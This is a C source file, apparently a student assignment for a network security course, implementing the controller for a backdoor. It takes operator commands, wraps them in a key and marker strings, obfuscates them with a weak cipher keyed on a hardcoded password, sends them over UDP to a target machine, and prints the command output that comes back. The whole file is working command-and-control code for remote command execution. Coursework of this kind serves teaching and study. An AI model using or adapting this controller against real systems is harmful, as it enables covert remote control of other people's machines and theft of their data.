// Name:    Brandon Gillespie and Justen DePourcq
// Date:    October 19th, 2018
// Class:   COMP8505
// Assn:    Assignment 3 - Backdoor
// Purpose: This program acts as the server that sends commands to the backdoor.

// Include statements.
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <netdb.h>
#include <getopt.h>
#include <errno.h>

// Define statements.
#define OPTIONS "h:s:r:k:"
#define PASSLEN 8
#define PASSWORD "password"
#define MAXLEN 65000

// Struct required for getopt_long, holding option information.
static struct option long_options[] = {
    {"sport",   required_argument, 0, 's'},
    {"rport",   required_argument, 0, 'r'},
    {"host",    required_argument, 0, 'h'},
    {"key",     required_argument, 0, 'k'},
    {0,         0,                 0, 0}
};

// Main
int main(int argc, char **argv) {
    // Allocate variables.
    int sd, port, send_sd, server_len, rport, opt, len;
    char sbuf[MAXLEN], rbuf[MAXLEN], ebuf[MAXLEN];
    const char *key, *rportString, *sportString, *shost;
    struct sockaddr_in server, client, junk;
    char command[MAXLEN], *host, *ptr;
    struct hostent *hp;
    size_t junk_len;

    key = rportString = sportString = shost = NULL;

    // Get command line arguments.
    int o_index = 0;
    while ((opt = getopt_long(argc, argv, OPTIONS, long_options, &o_index)) != -1) {
      switch (opt) {
        case 's':
          sportString = optarg;
          printf("Send Port Selected: %s\n", optarg);
        break;
        case 'r':
          rportString = optarg;
          printf("Receive Port Selected: %s\n", optarg);
        break;
        case 'h':
          host = optarg;
          printf("Host Selected: %s\n", optarg);
        break;
        case 'k':
          key = optarg;
          printf("Key Selected: %s\n", optarg);
        break;
      }
    }

    // Check command line arguments to see if they are null. If they are
    // we need to give a default value before parsing the value.
    if (sportString == NULL) {
      printf("Default sPort being used: 9000\n");
      sportString = "9000";
    }
    port = strtoul(sportString, NULL, 0);
      if (errno == EINVAL || errno == ERANGE) {
        perror("strtoul");
        return EXIT_FAILURE;
    }

    if (rportString == NULL) {
      printf("Default rPort being used: 9001\n");
      rportString = "9001";
    }
    rport = strtoul(rportString, NULL, 0);
      if (errno == EINVAL || errno == ERANGE) {
        perror("strtoul");
        return EXIT_FAILURE;
    }

    if (host == NULL) {
      printf("Default host being used: 192.168.0.10\n");
      host = "192.168.0.10";
    }

    if (key == NULL) {
      printf("Default key being used: foobar\n");
      key = "foobar";
    }

    // Setup receive socket.
    if ((sd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("Can't create socket \n");
        exit(1);
    }

    // Setup send socket.
    if ((send_sd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("Can't create socket 2\n");
        exit(1);
    }

    // Setup server structure.
    bzero((char *)&server, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    if ((hp = gethostbyname(host)) == NULL) {
        perror("Hostname\n");
        exit(1);
    }
    bcopy(hp->h_addr, (char *)&server.sin_addr, hp->h_length);

    // Setup client structure.
    bzero((char *)&client, sizeof(client));
    client.sin_family = AF_INET;
    client.sin_port = htons(rport);
    client.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(sd, (struct sockaddr *)&client, sizeof(client)) == -1) {
        perror("Could not bind \n");
        exit(1);
    }

    // Main loop that gets input, packages the command, sends, and receives.
    while (1) {
        // Clear buffers.
        memset(rbuf, 0, sizeof(rbuf));
        memset(sbuf, 0, sizeof(sbuf));
        memset(ebuf, 0, sizeof(ebuf));
        memset(command, 0, sizeof(command));

        // Get command.
        fgets(command, MAXLEN, stdin);

        ptr = strstr(command, "\n");
        *ptr = '\0';

        len = strlen(key) + strlen("start[") + strlen("]end") + strlen(command);

        // Add key.
        strcat(sbuf, key);
        // Put start string on encryption buffer.
        strcat(ebuf, "start[");
        // Put command string on encryption buffer.
        strcat(ebuf, command);
        // Put end string on encryption buffer.
        strcat(ebuf, "]end");

        printf("Encrypt Buffer: %s\n\n\n", ebuf);

        // Encrypt.
        int p_index = 0;
        for (int i = 0; i < len; i++) {
            //ebuf[i] = ebuf[i] - 5;
            int tmp = ebuf[i];
            tmp = (tmp - PASSWORD[p_index]) * -1;
            ebuf[i] = tmp;
            ++p_index;
            if (p_index == (strlen(PASSWORD) - 1)) { p_index = 0; }
        }
        printf("Encrypted Buffer: %s\n\n\n", ebuf);
        // Add encrypted payload onto real payload.
        strcat(sbuf, ebuf);

        printf("Sending command\n");
        // Send command.
        junk_len = 0;
        server_len = sizeof(server);
      	if (sendto(sd, sbuf, len, 0, (struct sockaddr *)&server, server_len) == -1) {
      		perror("sendto failure");
      		exit(1);
      	}

        printf("Receiving response\n");
        // Receive response.
        if (recvfrom(sd, rbuf, MAXLEN, 0, (struct sockaddr *)&junk, &junk_len) < 0) {
            perror("Receive failed \n");
            exit(1);
        }

        // Print reponse.
        printf("From Host: \n%s\n", rbuf);
    }
}
